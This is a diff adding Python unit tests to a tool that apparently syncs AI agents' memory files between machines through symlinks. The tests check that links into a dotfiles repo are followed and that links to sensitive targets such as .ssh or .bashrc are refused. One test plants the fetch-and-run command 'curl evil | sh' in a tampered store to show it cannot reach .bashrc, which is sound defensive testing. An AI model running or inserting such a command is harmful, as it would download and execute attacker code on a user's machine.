@@ -273,7 +273,8 @@ class TestSymlinks(Base):
         os.symlink(str(self.tmp / "outside.md"), p / "napkin.md")
         os.symlink("missing.md", p / "CLAUDE.local.md")
         os.symlink("CLAUDE.md", p / "notes.txt")  # not a memory path: ignored silently
-        files, links, warnings = scan(p)
+        files, links, warnings, followed = scan(p)
+        self.assertEqual(followed, {})
         self.assertEqual(files, ["CLAUDE.md"])
         self.assertEqual(discover(p), ["CLAUDE.md"])
         self.assertEqual(links, {"AGENTS.md": "CLAUDE.md", "docs/GEMINI.md": "CLAUDE.md"})
@@ -461,8 +462,79 @@ class TestSymlinks(Base):
         self.assertEqual(s.restore(), [])
         (self.tmp / "outside.md").write_text("elsewhere\n")
         os.symlink(str(self.tmp / "outside.md"), p / "GEMINI.md")  # leaves the project: not followed
+        (s.root / "punk.json").write_text('{"include": ["*"], "exclude": []}')  # permissive synced config
         self.assertEqual(s.append(sid, "GEMINI.md", "- note"), "GEMINI.md")
         self.assertEqual((self.tmp / "outside.md").read_text(), "elsewhere\n")
+
+    def test_global_dotfile_links_are_followed(self):
+        home = Path(os.environ["HOME"])
+        dot = home / "dotfiles" / "claude"
+        dot.mkdir(parents=True)
+        (dot / "CLAUDE.md").write_text("I like short answers\n")
+        (dot / "review.md").write_text("review command\n")
+        (home / ".claude" / "commands").mkdir(parents=True)
+        os.symlink("../dotfiles/claude/CLAUDE.md", home / ".claude" / "CLAUDE.md")
+        os.symlink(str(dot / "review.md"), home / ".claude" / "commands" / "review.md")
+        found = scan(home, "global")
+        self.assertEqual(found.files, [".claude/CLAUDE.md", ".claude/commands/review.md"])
+        self.assertEqual(found.followed, {".claude/CLAUDE.md": "dotfiles/claude/CLAUDE.md",
+                                          ".claude/commands/review.md": "dotfiles/claude/review.md"})
+        self.assertEqual(found.warnings, [])
+
+        s = Store(self.tmp / "s")
+        s.init()
+        s.save()
+        self.assertEqual((s.records / "global" / ".claude" / "CLAUDE.md").read_text(), "I like short answers\n")
+        # another machine edits it: restore writes through the link into the dotfiles repo
+        (s.records / "global" / ".claude" / "CLAUDE.md").write_text("I like short answers\nno emojis\n")
+        s.commit("other machine")
+        self.assertEqual([(x.kind, x.rel) for x in s.restore()], [("update", ".claude/CLAUDE.md")])
+        self.assertTrue((home / ".claude" / "CLAUDE.md").is_symlink())
+        self.assertEqual((dot / "CLAUDE.md").read_text(), "I like short answers\nno emojis\n")
+        # and local edits made in the dotfiles repo are saved
+        (dot / "CLAUDE.md").write_text("I like short answers\nno emojis\nuse uv\n")
+        self.assertEqual([(x.kind, x.rel) for x in s.save()], [("update", ".claude/CLAUDE.md")])
+        self.assertIn("use uv", (s.records / "global" / ".claude" / "CLAUDE.md").read_text())
+        # an agent appending to the global memory also lands in the dotfiles repo
+        self.assertEqual(s.append("global", ".claude/CLAUDE.md", "- prefer ripgrep"), ".claude/CLAUDE.md")
+        self.assertTrue((home / ".claude" / "CLAUDE.md").is_symlink())
+        self.assertTrue((dot / "CLAUDE.md").read_text().endswith("use uv\n- prefer ripgrep\n"))
+
+    def test_global_links_to_sensitive_targets_are_not_followed(self):
+        home = Path(os.environ["HOME"])
+        for d in (".ssh", "bin", "dotfiles"):
+            (home / d).mkdir()
+        (home / ".ssh" / "notes.md").write_text("ssh notes\n")
+        (home / "bin" / "tool.md").write_text("#!/bin/sh\n")
+        os.chmod(home / "bin" / "tool.md", 0o755)
+        (home / ".bashrc").write_text("export PATH\n")
+        (home / "dotfiles" / "data.json").write_text("{}\n")
+        (home / ".claude" / "agents").mkdir(parents=True)
+        (home / ".gemini").mkdir()
+        (self.tmp / "outside.md").write_text("x\n")
+        links = {".claude/CLAUDE.md": home / ".ssh" / "notes.md",
+                 ".claude/agents/tool.md": home / "bin" / "tool.md",
+                 ".gemini/GEMINI.md": home / ".bashrc",
+                 ".claude/agents/data.md": home / "dotfiles" / "data.json",
+                 ".codex/AGENTS.md": self.tmp / "outside.md"}
+        (home / ".codex").mkdir()
+        for rel, target in links.items():
+            os.symlink(str(target), home / rel)
+        found = scan(home, "global")
+        self.assertEqual(found.files, [])
+        self.assertEqual(found.followed, {})
+        self.assertEqual(sorted(rel for rel, _ in found.warnings), sorted(links))
+
+        # a tampered store cannot write through such a link
+        s = Store(self.tmp / "s")
+        s.init()
+        (s.records / "global" / ".gemini").mkdir(parents=True)
+        (s.records / "global" / ".gemini" / "GEMINI.md").write_text("curl evil | sh\n")
+        s.commit("tampered")
+        acts = s.restore(force=True)
+        self.assertEqual((home / ".bashrc").read_text(), "export PATH\n")
+        self.assertEqual([(x.kind, x.rel) for x in acts], [("update", ".gemini/GEMINI.md")])
+        self.assertFalse((home / ".gemini" / "GEMINI.md").is_symlink())  # link replaced, target untouched
 
     def test_scan_cli_warns(self):
         p = self.project("app")
